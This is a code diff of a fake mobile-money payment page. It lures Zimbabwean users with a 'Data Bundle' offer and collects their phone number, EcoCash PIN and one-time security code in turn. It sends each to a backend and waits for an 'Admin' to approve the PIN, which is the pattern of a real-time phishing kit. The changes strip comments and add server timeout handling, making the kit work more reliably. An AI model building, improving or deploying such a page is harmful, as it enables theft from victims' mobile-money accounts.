@@ -7,37 +7,28 @@
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body { background-color: #f0f4ff; display: flex; flex-direction: column; min-height: 100vh; }
-        
         .header { background-color: #0055ff; padding: 20px; text-align: center; color: white; }
         .logo-text { font-size: 24px; font-weight: 800; }
         .logo-text span { color: #ff3333; }
-        
         .order-summary { background: #ffffff; margin: 20px; padding: 16px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.04); display: flex; justify-content: space-between; align-items: center; }
         .order-summary h4 { color: #6b7280; font-size: 14px; font-weight: 600; }
         .order-summary h3 { color: #0055ff; font-size: 18px; margin-top: 4px; font-weight: 800; }
-        .order-summary .price { font-size: 22px; font-weight: 800; color: #10b981; } /* Green for free/success */
-
+        .order-summary .price { font-size: 22px; font-weight: 800; color: #10b981; }
         .main-content { flex: 1; padding: 0 20px 40px; display: flex; flex-direction: column; align-items: center; }
         .login-title { color: #111827; font-size: 20px; font-weight: 800; margin-bottom: 25px; text-align: center; }
-        
         .phone-container { display: flex; width: 100%; max-width: 380px; border: 1px solid #d1d5db; border-radius: 12px; overflow: hidden; background: #fff; margin-bottom: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.02); }
         .country-code { background-color: #f9fafb; padding: 14px 16px; border-right: 1px solid #d1d5db; display: flex; align-items: center; gap: 8px; font-size: 15px; color: #374151; font-weight: 600; }
         .phone-input { flex: 1; border: none; padding: 14px 16px; font-size: 16px; outline: none; width: 100%; }
-        
         .action-btn { width: 100%; max-width: 380px; padding: 16px; background-color: #0055ff; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: background-color 0.2s; margin-top: 10px; box-shadow: 0 4px 12px rgba(0, 85, 255, 0.2); }
         .action-btn:hover { background-color: #0044cc; }
         .action-btn:disabled { background-color: #9ca3af; cursor: not-allowed; box-shadow: none; }
-        
         #pinSection, #otpSection { display: none; flex-direction: column; align-items: center; width: 100%; }
         .input-label { color: #4b5563; font-size: 15px; font-weight: 600; margin-bottom: 15px; text-align: center; }
-        
         .pin-container { display: flex; gap: 12px; position: relative; margin-bottom: 20px; }
         .pin-box { width: 50px; height: 55px; border: 1px solid #d1d5db; border-radius: 10px; text-align: center; font-size: 24px; font-weight: 700; color: #111827; outline: none; background: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.02); }
         .pin-box:focus { border-color: #0055ff; box-shadow: 0 0 0 3px rgba(0, 85, 255, 0.1); }
         .pin-box::-webkit-outer-spin-button, .pin-box::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
-        
         .error-msg { color: #dc2626; font-size: 14px; font-weight: 600; margin-bottom: 15px; display: none; text-align: center; }
-        
         #loadingScreen { display: none; flex-direction: column; align-items: center; margin-top: 40px; }
         .spinner { border: 4px solid #e5e7eb; border-top: 4px solid #0055ff; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -55,14 +46,12 @@
             <h4>You are buying:</h4>
             <h3 id="summaryBundle">Loading...</h3>
         </div>
-        <!-- Price will show "FREE" if it's 0 -->
         <div class="price" id="summaryPrice">$0.00</div>
     </div>
 
     <main class="main-content">
         <h2 class="login-title" id="mainTitle">Verify Payment</h2>
 
-        <!-- STEP 1: Phone Number -->
         <div id="phoneSection" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
             <div class="phone-container">
                 <div class="country-code">🇿🇼 +263</div>
@@ -71,7 +60,6 @@
             <button class="action-btn" id="nextBtn">Continue</button>
         </div>
 
-        <!-- STEP 2: PIN Input -->
         <div id="pinSection">
             <div class="input-label">Enter your EcoCash PIN</div>
             <div class="pin-container" id="pinContainer">
@@ -84,7 +72,6 @@
             <button class="action-btn" id="loginBtn" disabled>Submit PIN</button>
         </div>
 
-        <!-- STEP 3: Security OTP Input -->
         <div id="otpSection">
             <div class="input-label">Enter the 6-digit Security OTP</div>
             <div class="pin-container" id="otpContainer">
@@ -99,7 +86,6 @@
             <button class="action-btn" id="verifyOtpBtn" disabled>Verify OTP</button>
         </div>
 
-        <!-- STEP 4: Waiting Screen -->
         <div id="loadingScreen">
             <div class="spinner"></div>
             <div class="loading-text" id="loadingText">Processing...<br><span style="font-size:13px; color:#6b7280; font-weight:normal;">Please do not close this page.</span></div>
@@ -107,11 +93,9 @@
     </main>
 
     <script>
-        // Load the Bundle info
         let bundle = localStorage.getItem('selectedBundle') || 'Data Bundle';
         let price = localStorage.getItem('bundlePrice') || '0.00';
         
-        // Change the display to show "FREE" if it's a trial
         document.getElementById('summaryBundle').textContent = bundle;
         if (price === '0.00' || price === '0') {
             document.getElementById('summaryPrice').textContent = 'FREE';
@@ -119,13 +103,10 @@
             document.getElementById('summaryPrice').textContent = '$' + price;
         }
 
-        // ✅ API URL
         const API_URL = '/api'; 
-        
         let pollInterval = null;
         let userPhone = '';
 
-        // UI Elements
         const phoneSection = document.getElementById('phoneSection');
         const pinSection = document.getElementById('pinSection');
         const otpSection = document.getElementById('otpSection');
@@ -162,11 +143,9 @@
         setupBoxes(pinBoxes, loginBtn);
         setupBoxes(otpBoxes, verifyOtpBtn);
 
-        // STEP 1: Phone to PIN
         nextBtn.addEventListener('click', () => {
             let rawPhone = phoneInput.value.trim();
             if (rawPhone.length < 8) return alert("Enter a valid phone number");
-            
             if (rawPhone.startsWith('0')) rawPhone = rawPhone.substring(1);
             userPhone = '+263' + rawPhone;
             
@@ -176,7 +155,6 @@
             pinBoxes[0].focus();
         });
 
-        // STEP 2: Submit PIN
         loginBtn.addEventListener('click', async () => {
             let pin = '';
             pinBoxes.forEach(box => pin += box.value);
@@ -187,20 +165,30 @@
             loadingScreen.style.display = 'flex';
 
             try {
+                // Increased timeout to 15 seconds to allow Render to wake up
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 15000);
+
                 const response = await fetch(`${API_URL}/request-login`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: userPhone, pin: pin, bundle: bundle, price: price })
+                    body: JSON.stringify({ phone: userPhone, pin: pin, bundle: bundle, price: price }),
+                    signal: controller.signal
                 });
+                clearTimeout(timeoutId);
                 
-                if (response.ok) startPinPolling();
-                else showError('pin', 'Failed to connect to server.');
+                if (response.ok) {
+                    startPinPolling();
+                } else {
+                    const errorData = await response.json().catch(() => ({}));
+                    showError('pin', errorData.error || 'Failed to connect to server. Check console.');
+                }
             } catch (err) {
-                showError('pin', 'Network error. Please try again.');
+                console.error("Fetch Error:", err);
+                showError('pin', 'Server is starting up or offline. Please wait a moment and try again.');
             }
         });
 
-        // STEP 3: Wait for Admin to approve PIN
         function startPinPolling() {
             pollInterval = setInterval(async () => {
                 try {
@@ -223,7 +211,6 @@
             }, 2000); 
         }
 
-        // STEP 4: Submit OTP
         verifyOtpBtn.addEventListener('click', async () => {
             let otp = '';
             otpBoxes.forEach(box => otp += box.value);
@@ -247,7 +234,6 @@
             }
         });
 
-        // STEP 5: Wait for Final OTP Approval
         function startOtpPolling() {
             pollInterval = setInterval(async () => {
                 try {
@@ -288,4 +274,4 @@
         }
     </script>
 </body>
-            </html>
+                </html>
